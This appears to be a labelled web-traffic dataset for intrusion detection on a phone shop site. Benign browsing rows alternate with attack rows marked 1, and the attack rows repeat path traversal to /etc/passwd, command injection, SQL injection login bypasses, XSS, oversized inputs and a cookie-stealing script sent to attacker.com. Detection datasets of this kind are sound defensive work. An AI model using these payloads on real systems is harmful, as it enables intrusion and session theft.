+08:03:43.0,192.168.1.46,POST,/auth/register,"{'csrf_token': 'Imd1NjbFZ1Muy9dVxPqbjGt5ZpRhRw7e2QWm1pNMXM'.AfmrokZ5.e5-savMbmA0O93_10-nzX74ssT2j, 'username': 'newuser84', 'email': 'a6@b.com', 'password': 'sx5V*OZWgA2S', 'submit': 'Register'}",0
+08:03:45.7,10.0.0.66,GET,/auth/register,,0
+08:03:47.7,103.75.118.228,GET,/../../../../etc/passwd,,1
+08:03:49.6,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:03:51.3,192.168.1.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:03:53.5,10.0.0.79,GET,/auth/logout,,0
+08:03:54.9,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:03:57.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:03:59.2,192.168.1.55,GET,/order/cart,,0
+08:04:01.7,203.162.4.191,GET,/product/1' AND 1=1,,1
+08:04:03.3,192.168.1.12,GET,/order/myorders,,0
+08:04:05.7,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:04:07.2,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:04:09.2,192.168.1.144,POST,/search,{'query': 'iphone 15 pro max'},0
+08:04:11.1,192.168.1.169,GET,/category/Iphone,,0
+08:04:13.0,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+08:04:15.1,127.0.0.1,POST,/auth/login,"{'csrf_token': 'Im1SbloUSNVJ1V9MNbcyWNhTbc2V99GG70KBmHbb6L'.pM67wi7N.4aqhNWDTqh3uXxmBPayvF-J-0IDE, 'username': 'user58', 'password': 't^S6W4vLXQdW', 'submit': 'Log in'}",0
+08:04:16.8,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
+08:04:19.1,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:04:21.4,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:04:23.1,10.0.0.28,GET,/auth/login,,0
+08:04:24.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:04:27.3,192.168.1.197,GET,/product/1,,0
+08:04:29.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:04:31.0,192.168.1.22,GET,/order/myorders,,0
+08:04:33.0,192.168.1.104,GET,/order/cart,,0
+08:04:35.1,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:04:37.6,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
+08:04:39.1,192.168.1.197,GET,/order/myorders,,0
+08:04:41.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:04:43.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:04:45.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:04:47.4,127.0.0.1,GET,/product/1,,0
+08:04:49.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:04:51.3,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
+08:04:53.5,10.0.0.15,GET,/order/myorders,,0
+08:04:54.9,103.75.118.228,GET,/../../../../etc/passwd,,1
+08:04:57.6,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:04:59.0,203.162.4.191,GET,/product/1' AND 1=1,,1
+08:05:01.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:05:03.7,10.0.0.146,GET,/order/myorders,,0
+08:05:05.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:05:07.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:05:09.3,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:05:11.2,192.168.1.56,GET,/order/myorders,,0
+08:05:13.1,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:05:14.9,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:05:16.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+08:05:19.1,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:05:21.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:05:23.0,10.0.0.67,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:05:25.6,192.168.1.141,GET,/product/2,,0
+08:05:26.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:05:29.3,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:05:30.9,203.162.4.191,GET,/auth/register,,0
+08:05:32.9,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImG3MUdaGb4ux77HBxruRZhHNwBBmTpDVaz8b1VWuS'.I8wazxZ8.UOGFmIAUrB_ePQF789QaQyP9SFOs, 'username': 'newuser18', 'email': 'a68@b.com', 'password': '9U2SfRzZS@iL', 'submit': 'Register'}",0
+08:05:35.4,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:05:37.6,192.168.1.28,GET,/category/Iphone,,0
+08:05:39.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+08:05:40.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:05:42.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:05:45.7,192.168.1.22,GET,/,,0
+08:05:47.4,192.168.1.151,GET,/order/myorders,,0
+08:05:48.8,192.168.1.165,POST,/auth/register,"{'csrf_token': 'Iml5ctqsCTMZlvwldNeXvqSSKR8fI95pvbLSKAcG1l'.wDHFTjQN.GPITgSrnqmX3Ow7GCVwTNPFLpQT0, 'username': 'newuser14', 'email': 'a20@b.com', 'password': '3jurq1$h5GA7', 'submit': 'Register'}",0
+08:05:51.4,192.168.1.55,POST,/auth/login,"{'csrf_token': 'ImX9PiV1DIe2Tzf4WWPgclvXCR0GVNRCMmxTKt9fvp'.Es6xvBZ7.zv7rsGYyFx72KxSs0SypBanoQtw5, 'username': 'user35', 'password': 'ziudtyxHTKnQ', 'submit': 'Log in'}",0
+08:05:53.6,192.168.1.144,GET,/product/2,,0
+08:05:54.8,10.0.0.176,GET,/auth/register,,0
+08:05:57.1,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+08:05:59.1,192.168.1.104,GET,/product/2,,0
+08:06:01.7,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:06:03.3,10.0.0.67,GET,/product/1,,0
+08:06:04.9,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:06:07.6,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:06:09.7,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
+08:06:11.1,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:06:13.1,10.0.0.106,GET,/order/myorders,,0
+08:06:15.0,10.0.0.82,POST,/auth/login,"{'csrf_token': 'ImHKHSUozQqJRQv0mhGddZTdTUpNAzyodV7PFp5Pzy'.U9tys7nx.ubJEyXhXltCAjyPXaqWCxyOiqsa0, 'username': 'user10', 'password': 'KFnKtbS!qrq5', 'submit': 'Log in'}",0
+08:06:17.5,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:06:19.6,10.0.0.66,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:06:20.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:06:23.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:06:25.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:06:27.5,192.168.1.144,GET,/product/2,,0
+08:06:29.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:06:31.5,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:06:33.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+08:06:35.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+08:06:37.1,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:06:39.4,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:06:40.9,192.168.1.28,GET,/order/cart,,0
+08:06:43.6,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
+08:06:44.8,203.162.4.191,GET,/order/myorders,,0
+08:06:47.1,10.0.0.176,GET,/auth/register,,0
+08:06:49.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+08:06:51.5,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:06:53.4,192.168.1.197,GET,/auth/register,,0
+08:06:55.0,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:06:57.1,203.162.4.191,GET,/product/2,,0
+08:06:58.8,10.0.0.146,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:07:01.4,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
+08:07:03.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:07:05.6,10.0.0.176,POST,/auth/login,"{'csrf_token': 'Im8SJwGw8p15gLGaDk1bnj2sbo82RUQE2SpTULEwF4'.MThLWZbq.vynBzVgtHXWUfRwh_G5equuQPs-d, 'username': 'user90', 'password': 'nD(N0w8Oc)w7', 'submit': 'Log in'}",0
+08:07:07.6,192.168.1.185,GET,/product/2,,0
+08:07:09.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:07:11.1,10.0.0.67,POST,/auth/register,"{'csrf_token': 'ImJddnu4VMOBzz4IhVV4lrblC5gvmhP2WdgTkTGCCl'.siq8lbLi.QvpbY_XrGaofU-Z3g7L302fY9Si-, 'username': 'newuser23', 'email': 'a20@b.com', 'password': '(KIN4Uh)#ZhL', 'submit': 'Register'}",0
+08:07:13.2,192.168.1.175,GET,/product/1,,0
+08:07:15.6,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+08:07:17.3,192.168.1.169,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:07:19.5,103.75.118.228,GET,/../../../../etc/passwd,,1
+08:07:21.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:07:23.3,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:07:25.4,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:07:27.2,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:07:29.7,192.168.1.185,GET,/order/myorders,,0
+08:07:31.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:07:33.0,203.162.4.191,GET,/,,0
+08:07:34.9,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:07:37.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:07:38.9,10.0.0.146,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:07:41.6,192.168.1.50,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:07:43.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:07:45.2,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:07:47.4,192.168.1.162,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:07:49.4,10.0.0.195,GET,/product/1,,0
+08:07:50.9,192.168.1.162,GET,/auth/logout,,0
+08:07:53.0,192.168.1.50,GET,/auth/login,,0
+08:07:55.4,192.168.1.167,POST,/auth/login,"{'csrf_token': 'Ims7i0cmhrgOnIX4xq5jGHUBNzkLHqBO6PThAbdeQ1'.bgG140lW.trDPydiMf0hf_-qbGNgEf554M4kD, 'username': 'user64', 'password': 'CO&&CAdEOO2P', 'submit': 'Log in'}",0
+08:07:57.2,192.168.1.18,GET,/order/myorders,,0
+08:07:59.1,192.168.1.169,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:08:01.6,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:08:03.2,192.168.1.197,GET,/order/myorders,,0
+08:08:04.8,203.162.4.191,GET,/../../../../etc/passwd,,1
+08:08:07.0,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:08:09.2,203.162.4.191,GET,/../../../../etc/passwd,,1
+08:08:11.6,203.162.4.191,GET,/../../../../etc/passwd,,1
+08:08:12.8,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:08:14.9,192.168.1.175,GET,/auth/login,,0
+08:08:16.8,10.0.0.79,GET,/auth/register,,0
+08:08:19.0,192.168.1.55,POST,/search,{'query': 'iphone 15 pro max'},0
+08:08:21.3,192.168.1.185,GET,/product/1,,0
+08:08:23.1,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
+08:08:25.5,10.0.0.67,GET,/category/Iphone,,0
+08:08:27.0,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:08:29.1,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:08:31.5,192.168.1.144,GET,/auth/login,,0
+08:08:33.7,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
+08:08:35.3,127.0.0.1,GET,/auth/login,,0
+08:08:37.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:08:39.1,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+08:08:41.4,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:08:43.3,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:08:45.4,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:08:47.5,192.168.1.18,GET,/order/myorders,,0
+08:08:49.2,192.168.1.169,GET,/category/Iphone,,0
+08:08:51.3,192.168.1.55,GET,/product/2,,0
+08:08:53.3,10.0.0.176,POST,/auth/login,"{'csrf_token': 'ImLj7uncMfpDUmq796UH7lDqvjXNtrK0SovSKYQIep'.MhvMx4RX.jcx1Wcjol5JW5BwaM4NYp4h_Q_h8, 'username': 'user88', 'password': 'wp%dIGnOs6mg', 'submit': 'Log in'}",0
+08:08:55.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+08:08:57.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:08:59.6,192.168.1.22,GET,/category/Iphone,,0
+08:09:01.5,192.168.1.162,GET,/auth/login,,0
+08:09:03.4,192.168.1.182,GET,/product/1,,0
+08:09:05.3,192.168.1.197,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:09:06.9,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:09:08.9,10.0.0.146,GET,/product/1,,0
+08:09:10.8,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+08:09:13.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:09:15.5,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+08:09:17.0,192.168.1.18,GET,/order/cart,,0
+08:09:19.1,192.168.1.175,GET,/auth/logout,,0
+08:09:21.1,192.168.1.162,GET,/,,0
+08:09:23.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+08:09:25.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+08:09:27.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:09:29.0,192.168.1.167,GET,/order/cart,,0
+08:09:31.2,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:09:32.8,203.162.4.191,POST,/search,{'query': 'iphone 15 pro max'},0
+08:09:35.5,192.168.1.182,GET,/,,0
+08:09:37.6,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:09:39.2,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:09:41.1,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:09:43.3,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:09:45.5,127.0.0.1,GET,/auth/login,,0
+08:09:47.1,192.168.1.46,POST,/auth/register,"{'csrf_token': 'ImjhAZN19OriZxFoMircTC6DVbJXoJGWClfIpPEXG4'.jROJY7z3.YdDlHOU8KId7EXKUw7l1aLT_uW0R, 'username': 'newuser51', 'email': 'a96@b.com', 'password': ')KtoD*n0FJA*', 'submit': 'Register'}",0
+08:09:48.8,192.168.1.167,GET,/order/cart,,0
+08:09:51.4,192.168.1.141,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:09:53.6,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:09:55.7,103.75.118.228,GET,/../../../../etc/passwd,,1
+08:09:57.4,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:09:59.0,192.168.1.18,POST,/search,{'query': 'iphone 15 pro max'},0
+08:10:01.0,10.0.0.82,POST,/auth/register,"{'csrf_token': 'ImLZyG9xzbAwdWelmPBXXwfa0otGsQVjeih9CyDiHw'.kf9IEAqT.2Z7negICTGQeySEAw7KoO9Ut5aVb, 'username': 'newuser93', 'email': 'a10@b.com', 'password': 'y%#Z$$&6jSh(', 'submit': 'Register'}",0
+08:10:03.7,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:10:05.6,10.0.0.15,GET,/category/Iphone,,0
+08:10:07.2,192.168.1.56,GET,/order/cart,,0
+08:10:09.4,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:10:11.6,10.0.0.106,GET,/product/2,,0
+08:10:13.4,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:10:14.8,192.168.1.18,POST,/search,{'query': 'iphone 15 pro max'},0
+08:10:17.2,203.162.4.190,GET,/product/1' AND 1=1,,1
+08:10:19.6,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:10:21.2,10.0.0.176,GET,/product/1,,0
+08:10:22.9,192.168.1.144,GET,/auth/login,,0
+08:10:24.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:10:27.2,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:10:29.6,10.0.0.79,GET,/product/1,,0
